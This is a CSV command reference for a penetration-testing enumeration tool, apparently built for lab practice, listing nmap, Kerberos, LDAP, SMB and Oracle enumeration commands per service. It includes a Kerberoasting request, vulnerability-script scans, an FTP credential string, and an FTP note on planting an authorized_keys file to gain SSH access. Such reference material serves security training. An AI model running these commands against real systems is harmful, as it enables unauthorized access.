Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
DNS,53,Domain Name Service,DNS Tool,The first step of DNS enumeration,Modules/SquidsDnsTool.py {IP} {Domain_Name},Verified,1
FTP,21,File Transfer Protocol,,,"#ftp 10.11.1.8
Anonymous
-bi     <<< so that your put is done via binary

wget --mirror 'ftp://ftp_user:UTDRSCH53c""$6hys@10.10.10.59'
^^to download all dirs and files

wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' 
if PASV transfer is disabled

??are you in a users dir??
mkdir .ssh
    --on kali-- 
        ssh-keygen
        enter, enter, enter
        cd .ssh
        cp id_rsa.pub authorized_keys
cd .ssh
put authorized_keys
!!!now you can ssh as the user who's directory you were in!!!",Verified,1
Kerberos,88,AD Domain Authentication Service,"Pre Creds
",Brute Force to get Usernames,"nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\'{Domain_Name}\',userdb={Big_Userlist} {IP}",Verified,1
Kerberos,88,AD Domain Authentication Service,With Users,Brute Force with Usernames and Passwords,#consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h,Verified,2
Kerberos,88,AD Domain Authentication Service,With Creds,Attempt to get a list of user service principal names,#https://rootsecdev.medium.com/installing-impacket-on-kali-linux-2020-1d9ad69d10bb        GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs,"Unverified
",3
LDAP,389,Lightweight Directory Access Prorocol,Nmap Scan,Scan 389 with Nmap ldap-search script,nmap -p 389 --script ldap-search -Pn {IP},"Unverified
",1
LDAP,389,Lightweight Directory Access Prorocol,LdapSearch,Base LdapSearch,ldapsearch -h {IP} -x,Verified,2
LDAP,389,Lightweight Directory Access Prorocol,LdapSearch Naming Context Dump,Attempt to get LDAP Naming Context,ldapsearch -h {IP} -x -s base namingcontexts,Verified,3
LDAP,389,Lightweight Directory Access Prorocol,LdapSearch Big Dump,Need Naming Context to do big dump,"ldapsearch -h {IP} -x -b ""{Naming_Context}""",Verified,4
MySql,3306,MySql,Nmap Scan,MySql Nmap Scan,"nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306",Verified,1
Nmap,0,Generic Scans,Kickoff Scan,"Quick scan, Version scan, All Port Scan, UDP Scan ran one at a time in order",nmap -Pn -sS -p- {IP} && nmap -Pn {IP} && nmap -sC -sV -Pn {IP} && nmap -p- -Pn {IP} && sudo nmap -Pn -p- -sU {IP},Verified,1
Nmap,0,Generic Scans,Quick Scan,Quick Nmap Scan,nmap {IP},Verified,2
Nmap,0,Generic Scans,Version Scan,Scan for the Version of the Open Ports,nmap -sC -sV {IP},Verified,3
Nmap,0,Generic Scans,All Port Scan,Scan for All Open Ports,nmap -p- -Pn {IP},Verified,4
Nmap,0,Generic Scans,All Vulns Scan,Scan with All SMB Vuln Scripts,"nmap --script smb-vuln* -p 139,445 {IP}",Verified,5
Nmap,0,Generic Scans,Quiet Scan,Scan Quietly,nmap -Pn -sS -p- {IP},Verified,6
Nmap,0,Generic Scans,UDP Scan,Scan for Open UDP Ports,nmap -Pn -p- -su {IP},Verified,7
Oracle,1521,Oracle Database,Oracle Notes,Notes for Oracle,"#Oracle Notes
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki",Unverified,1
SMB,139445,Server Message Block,Enum4Linux,General SMB Scan,enum4linux -a {IP},Verified,1
SMB,139445,Server Message Block,Nmap Smb Scan 1,SMB Vuln Scan With Nmap,"nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}",Verified,2
SMB,139445,Server Message Block,Nmap Smb Scan 2,SMB Vuln Scan With Nmap (Less Specific),"nmap --script smb-vuln* -Pn -p 139,445 {IP}",Verified,3
